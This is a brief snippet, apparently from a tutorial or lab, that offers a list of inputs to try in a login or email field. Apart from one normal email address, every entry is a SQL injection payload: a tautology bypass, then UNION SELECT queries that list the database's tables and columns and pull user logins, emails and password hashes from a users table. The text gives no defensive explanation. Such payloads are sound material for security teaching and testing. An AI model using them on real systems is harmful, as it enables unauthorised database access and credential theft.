Here are some examples of some input to try:

```
ed@example.com

a" OR 1 = 1 -- 

a" UNION ALL SELECT TABLE_SCHEMA,TABLE_NAME from information_schema.TABLES; -- 

a" UNION ALL SELECT COLUMN_NAME,COLUMN_TYPE from information_schema.COLUMNS where TABLE_NAME = "my_users"; -- 

a" UNION ALL SELECT user_login,user_pass from my_users; -- 

a" UNION ALL SELECT user_email,user_pass from my_users; -- 
```
